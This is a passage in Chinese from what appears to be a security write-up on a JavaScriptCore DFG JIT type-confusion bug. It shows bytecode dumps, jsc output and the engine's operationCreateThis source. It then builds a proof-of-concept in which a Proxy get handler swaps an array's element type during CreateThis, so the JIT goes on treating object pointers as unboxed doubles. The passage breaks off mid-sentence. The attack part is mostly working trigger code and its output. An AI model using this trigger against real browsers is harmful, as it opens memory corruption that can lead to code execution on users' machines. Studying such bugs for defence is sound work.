    [   3] mov               loc4, loc3
    [   6] check_traps       
    [   7] mov               loc5, this
    [  10] create_this       this, this, 1, 0
    [  15] put_by_id         this, x(@id0), Int32: 1(const0), Bottom
    [  24] ret               this
可以看到，通过`put_by_id`字节码指令将1存入x属性中。现在我们将测试代码稍作修改
    function foo(arg) {
       this.x = arg[0];
    }
    var b = new foo([1.1]);
    print(b.x);
字节码如下
    [   0] enter             
    [   1] get_scope         loc3
    [   3] mov               loc4, loc3
    [   6] check_traps       
    [   7] mov               loc5, this
    [  10] create_this       this, this, 1, 0
    [  15] mov               loc6, this
    [  18] get_by_val        loc7, arg1, Int32: 0(const0)    Original; predicting None
    [  24] put_by_id         loc6, x(@id0), loc7, Bottom
    [  33] ret               this
通过`get_by_val`字节码指令从数组中取出元素0，然后通过`put_by_id`存入属性x中。  
现在加入触发DFG JIT优化的代码，再做测试,发现前期Parse以后的字节码是一样的，不同点在于这次存在了DFG JIT时的字节码展开，其中`[ 10]
create_this this, this, 1, 0和[ 18] get_by_val loc7, arg1, Int32: 0(const0)
Original; predicting None`被展开如下
    [10]
    CountExecution
    CheckCell
    NewObject
    MovHint
    [18]
    CountExecution
    JSConstant
    GetButterfly
    GetByVal
    MovHint
    ValueRep
可以知道，`CreateThis`被优化为了`CheckCell和NewObject`，并且在这种情况下参数arg的类型不可能发生变化，因此在`[ 0]
enter`使用了`CheckStructure`检查一次参数就可以了，这里无需再重复检查。现在，我们尝试为`foo`函数增加一个`Proxy`代理，这样，使用`foo_proxy`对象对`foo`进行间接访问时，会被代理拦截，并进入`handler`的`get`函数中处理。
    function foo(arg) {
       this.x = arg[0];
    }
    let handler = {
       get(target, prop) {
          print(prop);
          return target[prop];
       }
    };
    let foo_proxy = new Proxy(foo, handler);
    print(foo_proxy.a);
输出如下
    root@ubuntu:~/Desktop/bug_bin# ./jsc t.js
    a
因为我们通过`foo_proxy.a`间接的访问了`foo.a`属性，所以被拦截了。那我们使用`new foo_proxy()`会发生什么呢？
    function foo(arg) {
       this.x = arg[0];
    }
    let handler = {
       get(target, prop) {
          print(prop);
          return target[prop];
       }
    };
    let foo_proxy = new Proxy(foo, handler);
    print(new foo_proxy([1.1]));
输出如下
    root@ubuntu:~/Desktop/bug_bin# ./jsc t.js
    prototype
因为在创建一个对象的时候，是需要用到函数的`prototype`这个属性的，它是函数的原型，也是foo的一个自带属性，因此在创建对象时也可以被成功拦截。我们尝试加入`DFG
JIT`优化，并查看字节码
    function foo(arg) {
       this.x = arg[0];
    }
    let handler = {
       get(target, prop) {
          return target[prop];
       }
    };
    let foo_proxy = new Proxy(foo, handler);
    var b;
    for (var i=0;ivm();
        CallFrame* callFrame = DECLARE_CALL_FRAME(vm);
        JITOperationPrologueCallFrameTracer tracer(vm, callFrame);
        auto scope = DECLARE_THROW_SCOPE(vm);
        if (constructor->type() == JSFunctionType && jsCast(constructor)->canUseAllocationProfile()) {
            DeferTermination deferScope(vm);
            auto rareData = jsCast(constructor)->ensureRareDataAndAllocationProfile(globalObject, inlineCapacity);
            scope.releaseAssertNoException();
            ObjectAllocationProfileWithPrototype* allocationProfile = rareData->objectAllocationProfile();
            Structure* structure = allocationProfile->structure();
            JSObject* result = constructEmptyObject(vm, structure);
            if (structure->hasPolyProto()) {
                JSObject* prototype = allocationProfile->prototype();
                ASSERT(prototype == jsCast(constructor)->prototypeForConstruction(vm, globalObject));
                result->putDirect(vm, knownPolyProtoOffset, prototype);
                prototype->didBecomePrototype();
                ASSERT_WITH_MESSAGE(!hasIndexedProperties(result->indexingType()), "We rely on JSFinalObject not starting out with an indexing type otherwise we would potentially need to convert to slow put storage");
            }
            return result;
        }
        JSValue proto = constructor->get(globalObject, vm.propertyNames->prototype);
        RETURN_IF_EXCEPTION(scope, nullptr);
        if (proto.isObject())
            return constructEmptyObject(globalObject, asObject(proto));
        JSGlobalObject* functionGlobalObject = getFunctionRealm(globalObject, constructor);
        RETURN_IF_EXCEPTION(scope, nullptr);
        return constructEmptyObject(functionGlobalObject);
    }
其中的操作`SValue proto = constructor->get(globalObject,
vm.propertyNames->prototype);`会被我们JS层中的代理拦截，由此可以知道，`operationCreateThis`会回调JS层的代理函数。此时我们想到，在JS中的Proxy对象的handler中，我们可以操纵任意的对象，我们可以将参数arg的类型修改掉。于是这样构造
    function foo(arg) {
       this.x = arg[0];
    }
    var trigger = false;
    var arr = [1.1,2.2];
    let handler = {
       get(target, prop) {
          if (trigger) {
             arr[0] = {};
          }
          return target[prop];
       }
    };
    let foo_proxy = new Proxy(foo, handler);
    var b;
    for (var i=0;i<0x2000;i++) {
       b = new foo_proxy(arr);
    }
    trigger = true;
    b = new foo_proxy(arr);
    print(b.x);
这样，当`CreateThis`回调了`handler`中的get函数时，`arr[0] = {}`将arr的类型改为了对象数组类型，不再是`unboxed
double`，但是`CreateThis`回调结束以后，并没有重新对arg进行类型检查，仍然将其当做`unboxed